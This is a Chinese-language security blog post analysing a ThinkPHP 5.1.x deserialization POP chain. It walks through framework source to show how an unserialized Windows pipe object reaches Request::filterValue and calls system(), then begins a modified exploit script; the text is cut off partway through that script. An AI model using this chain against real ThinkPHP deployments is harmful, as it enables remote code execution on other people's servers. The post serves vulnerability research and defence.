
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>离怀秋</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="离怀秋">
<meta property="og:url" content="http://yoursite.com/page/4/index.html">
<meta property="og:site_name" content="离怀秋">
<meta property="article:author" content="离怀秋">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="离怀秋" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
<link rel="stylesheet" href="/css/style.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 4.2.1"></head>
<body>
<div id="container">
  <div id="wrap">
    <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">离怀秋</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">心未死 战未败</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
          <input type="submit" value="" class="search-form-submit">
          <input name=tn type=hidden value="bds">
          <input name=cl type=hidden value="3">
          <input name=ct type=hidden value="2097152">
          <input type="hidden" name="si" value="yoursite.com">
        </form>
      </div>
    </div>
  </div>
</header>
    <div class="outer">
      <section id="main">
  
    <article id="post-Thinkphp-5-1-x-pop链分析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/08/Thinkphp-5-1-x-pop%E9%93%BE%E5%88%86%E6%9E%90/" class="article-date">
  <time datetime="2019-10-08T08:10:10.000Z" itemprop="datePublished">2019-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/08/Thinkphp-5-1-x-pop%E9%93%BE%E5%88%86%E6%9E%90/">Thinkphp-5.1.x pop链分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>似乎由N1ctf的5.2pop链引起了pop链挖掘狂潮，接下来就分析一下5.1.x的pop链。</p>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p><img src="https://s2.ax1x.com/2019/10/07/u23DDH.png" alt="u23DDH.png"></p>
<h3 id="分析流程"><a href="#分析流程" class="headerlink" title="分析流程"></a>分析流程</h3><p><strong>起点 \thinkphp\library\think\process\pipes\Windows.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;close();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;removeFiles();</span><br><span class="line">&#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p><strong>跟进removeFiles函数</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">            @unlink($filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在removeFiles中调用了file_exists函数对$filename进行处理，对于需要判断的文件名，file_exists函数会将其当作字符串处理，如果我们给$filename赋值为一个类，那么将触发__toString方法</p>
<p><strong>__toString跳板</strong></p>
<p>\thinkphp\library\think\model\concern\Conversion.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进toJson函数</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span><span class="params">($options = JSON_UNESCAPED_UNICODE)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进toArray函数，这个函数代码比较多，只解析关键部分了。</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> $key =&gt; $name) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">            <span class="comment">// 追加关联对象属性</span></span><br><span class="line">            $relation = <span class="keyword">$this</span>-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!$relation) &#123;</span><br><span class="line">               $relation = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">               <span class="keyword">if</span> ($relation) &#123;</span><br><span class="line">                    $relation-&gt;visible($name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>寻找pop链的关键是最终找到可以进行危险操作的点，比如RCE点的寻找，pop链的寻找最终点一般落在__call方法</p>
<blockquote>
<p>一般PHP中的__call方法都是用来进行容错或者是动态调用,所以一般会在__call方法中使用</p>
<p>call_user_func($method, $args)</p>
<p>call_user_func_array([$obj,$method], $args)</p>
</blockquote>
<p>那么上面这个toArray函数正符合我们要触发的__call，触发点如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$relation-&gt;visible($name);</span><br></pre></td></tr></table></figure>

<p>我们需要为$relation找一个不存在visible方法的类，这样就可以成功触发__call方法了，那么该怎么去给$relation赋值呢，可以从上面的代码中看到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$relation = <span class="keyword">$this</span>-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$relation) &#123;</span><br><span class="line">   $relation = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br></pre></td></tr></table></figure>

<p>对于两个函数来说，$key的值就是append数组中的键值</p>
<p>先跟进getRelation函数</p>
<p><strong>\think\model\concern\RelationShip.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于这里的relation最后直接返回空了</p>
<p>跟进getAttr函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">($name, &amp;$item = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $notFound = <span class="keyword">false</span>;</span><br><span class="line">        $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">        $notFound = <span class="keyword">true</span>;</span><br><span class="line">        $value    = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进getData</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$name];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里把data数组中对应键值设置为Request类就行了</p>
<p>需要找到一个同时有Conversion和Attribute的类</p>
<p>很明显Model类符合这样的条件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> \<span class="title">JsonSerializable</span>, \<span class="title">ArrayAccess</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">TimeStamp</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>\thinkphp\library\think\Request.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (array_key_exists($method, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">         array_unshift($args, <span class="keyword">$this</span>);</span><br><span class="line">         <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[$method], $args);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $method);</span><br><span class="line"> &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>这样我们就可以控制$args了，这里是通过$this-&gt;hook[$method]去调用函数的，我们只需要通过在hook数组中给visible键赋予对应的值就可以了，这样就实现了调用Request类中任意方法了，不过这里还通过array_unshift函数把$this放到了$args数组，如下图</p>
<p><img src="https://s2.ax1x.com/2019/10/07/uRaIFe.png" alt="uRaIFe.png"></p>
<p>所以最终的形式 Function($this,$args)，这种情况下很难去进行命令执行之类的操作的</p>
<p>看第一篇pop链的分析思路，这点解析的很好</p>
<blockquote>
<p>Request类中有一个特殊的功能就是过滤器 filter(ThinkPHP的多个远程代码执行都是出自此处)所以可以尝试覆盖filter的方法去执行代码寻找使用了过滤器的所有方法发现input()函数满足条件</p>
</blockquote>
<p>在上一篇的RCE分析中，我们发现input方法是一个很神奇的东西，很多thinkphp的rce都是通过input进行rce的，其实主要的触发点如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">        array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">        <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">'7.1.0'</span>, <span class="string">'&lt;'</span>)) &#123;</span><br><span class="line">            <span class="comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;arrayReset($data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($type) &amp;&amp; $data !== $default) &#123;</span><br><span class="line">        <span class="comment">// 强制类型转换</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;typeCast($data, $type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通过回调函数array_walk_recursive，调用filterValue</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">            <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">            $value = call_user_func($filter, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_scalar($value)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">false</span> !== strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">                <span class="comment">// 正则过滤</span></span><br><span class="line">                <span class="keyword">if</span> (!preg_match($filter, $value)) &#123;</span><br><span class="line">                    <span class="comment">// 匹配不成功返回默认值</span></span><br><span class="line">                    $value = $default;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>再通过我们覆盖的$filter变量进行RCE</p>
<p><strong>同样这里也是通过filtervalue进行rce的，但是这里我们只能控制$filter，向上跟进input</strong></p>
<p>这里有一个注意点,在input函数中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">    <span class="comment">// 获取原始数据</span></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$name = (string) $name;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>如果这里name传的是数组的话那么直接String将报错终止程序，所以我们不能直接调用input，继续向上找调用input的函数，可以发现param比较满足这个条件</p>
<p><strong>param函数</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">        $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 自动获取请求变量</span></span><br><span class="line">        <span class="keyword">switch</span> ($method) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'POST'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;post(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PUT'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'DELETE'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PATCH'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;put(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                $vars = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">        $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">        $data = is_array($file) ? array_merge(<span class="keyword">$this</span>-&gt;param, $file) : <span class="keyword">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在param函数中通过array_merge将get参数传给$this-&gt;param，在param中可以控制Input的第一个函数，但是我们还是没法控制$name，接着向上寻找调用param的函数，可以发现isAjax函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span><span class="params">($ajax = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $value  = <span class="keyword">$this</span>-&gt;server(<span class="string">'HTTP_X_REQUESTED_WITH'</span>);</span><br><span class="line">    $result = <span class="string">'xmlhttprequest'</span> == strtolower($value) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $ajax) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result           = <span class="keyword">$this</span>-&gt;param(<span class="keyword">$this</span>-&gt;config[<span class="string">'var_ajax'</span>]) ? <span class="keyword">true</span> : $result;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以很明显的看到我们可以控制param的第一个位置的参数，这样我们就可以控制input函数第二个位置的参数了，就达到了我们想要的目的，这样就可以避免数组转化字符串报错了，那么接着回到input函数中，通过调用getFilter函数将值赋给$filter，接着回调filtervalue</p>
<p><img src="https://s2.ax1x.com/2019/10/07/uR4M5j.png" alt="uR4M5j.png"></p>
<p><strong>最终通过循环调用到calc</strong></p>
<p><img src="https://s2.ax1x.com/2019/10/07/uR4xWn.png" alt="uR4xWn.png"></p>
<p>调用栈如下</p>
<p><img src="https://s2.ax1x.com/2019/10/07/uR5VY9.png" alt="uR5VY9.png"></p>
<p>调用链</p>
<p><img src="https://s2.ax1x.com/2019/10/08/uWalAU.png" alt="uWalAU.png"></p>
<p>照着知道创宇的exp魔改了一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $append = [];</span><br><span class="line">    <span class="keyword">private</span> $data = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">"lihuaiqiu"</span>=&gt;[<span class="string">"1"</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">"lihuaiqiu"</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $hook = [];</span><br><span class="line">    <span class="keyword">protected</span> $filter = <span class="string">"system"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = [</span><br><span class="line">        <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">        <span class="string">'var_method'</span>       =&gt; <span class="string">'_method'</span>,</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">'var_ajax'</span>         =&gt; <span class="string">'_ajax'</span>,</span><br><span class="line">        <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">        <span class="string">'var_pjax'</span>         =&gt; <span class="string">'_pjax'</span>,</span><br><span class="line">        <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">        <span class="string">'var_pathinfo'</span>     =&gt; <span class="string">'s'</span>,</span><br><span class="line">        <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">        <span class="string">'pathinfo_fetch'</span>   =&gt; [<span class="string">'ORIG_PATH_INFO'</span>, <span class="string">'REDIRECT_PATH_INFO'</span>, <span class="string">'REDIRECT_URL'</span>],</span><br><span class="line">        <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">        <span class="string">'default_filter'</span>   =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">        <span class="string">'url_domain_root'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// HTTPS代理标识</span></span><br><span class="line">        <span class="string">'https_agent_name'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// IP代理获取标识</span></span><br><span class="line">        <span class="string">'http_agent_ip'</span>    =&gt; <span class="string">'HTTP_X_REAL_IP'</span>,</span><br><span class="line">        <span class="comment">// 